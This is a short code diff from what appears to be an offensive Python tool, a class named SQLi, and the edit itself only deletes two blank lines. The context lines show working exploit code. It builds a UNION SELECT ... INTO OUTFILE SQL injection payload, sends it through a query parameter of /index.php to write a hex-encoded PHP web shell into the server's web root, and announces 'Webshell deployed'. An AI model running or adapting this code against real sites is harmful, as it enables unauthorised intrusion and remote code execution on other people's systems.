@@ -280,10 +280,8 @@ class SQLi:
         path = f"{root}/shell.php"
         spinner = Spinner(f"Writing webshell to {path}...")
         spinner.start()
-
         payload = f"0x{self.SHELL.hex()},4 INTO OUTFILE '{path}'-- -"
         full = f"{self.CLOSURE} UNION SELECT 1,2,{payload}"
-
         self.client.get("/index.php", {"u": "1", "q": full})
         time.sleep(0.8)
         spinner.stop(f"Webshell deployed to {path}")
